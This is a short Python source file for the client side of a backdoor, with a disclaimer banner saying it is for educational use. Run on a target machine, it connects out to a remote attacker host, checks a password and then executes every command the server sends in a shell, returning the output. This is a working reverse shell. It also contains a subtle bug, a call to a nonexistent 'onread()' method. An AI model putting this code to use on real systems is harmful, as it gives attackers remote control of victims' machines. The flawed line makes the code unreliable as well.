"""
#========================================#
# This is for educational purposes only, #
#     do not use against any person.     #
#           Be a good person             #
#========================================#

Client part of a baackdoor program.
This code must be executed on the machine we want to attack wjth another machine.
When the code starts the server code must already be running.
A login system has also been added to start using the attacked machine.
We want to be a little gentle.
You can interrupt the connection typing: logout
"""
import socket
import subprocess


REMOTE_HOST = 'some.ip.addr'      # Ip of the machine where the server code run
REMOTE_PORT = 8022                # Port of the attacked device
CONNECT_TRY = 0                   # Variable to count login attempts
PASSWD      = "a password"        # Password for login
MAX_TRY     = 3                   # Max number of attempts
MSG_SIZE    = 2**11               # Size in bytes of the message recived from client

#==============================================================================
# Create socket connection and connect to the client
#==============================================================================

# A socket is a quick connection which allows the transmission of data between
# two processes on the same machine or different machines over a network
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connection():
    ''' Function to start the connection
    '''
    print('[<<<] Connection attempt')
    client.connect((REMOTE_HOST, REMOTE_PORT))
    client.send(f'{CONNECT_TRY}You are connected!\nNow you must login\n'.encode())
    login()

#==============================================================================
# Login function if the password is correct we call execute_shell()
#==============================================================================

def login():
    ''' Function to handle the login
    '''
    global CONNECT_TRY, MAX_TRY

    # Read password from server
    client.send('[>>>] Please login'.encode())
    pwd = client.recv(MSG_SIZE)
    CONNECT_TRY += 1

    # Check password
    if pwd.decode() == PASSWD:
        client.send('Connection done'.encode())
        execute_shell()

    # Only MAX_TRY attempts are possible
    elif pwd.decode() != PASSWD and CONNECT_TRY < MAX_TRY:
        client.send(f'{CONNECT_TRY}[>>>] Password is incorrect try again\n'.encode())
        login()

    # Else stop connection
    else :
        client.send(f'{CONNECT_TRY}[>>>] Too many attempt\n'.encode())
        client.close()

#==============================================================================
# Logout and closure of conncetion
#==============================================================================

def logout():
    ''' function to logout
    '''
    client.send('Ou revoir\n'.encode())
    client.close()

#==============================================================================
# Start of reciving and execute command from server machine
#==============================================================================

def execute_shell():

    while True:

        # Receiving command
        print("[<<<] Awaiting commands...")
        command = client.recv(MSG_SIZE)
        command = command.decode()

        # check for logout
        if command == 'logout': break

        # Execution of command
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

        # Send output to server
        output = op.stdout.read()
        output_error = op.stderr.onread()
        msg = output + output_error
        print("[<<<] Sending response...")

        # Handle empty output (e.g.: echo test > test.txt)
        if msg.decode() == "":
            client.send("Done".encode())
        else:
            client.send(output + output_error)

    # If break logout
    logout()

#==============================================================================
# Start of code
#==============================================================================

connection()
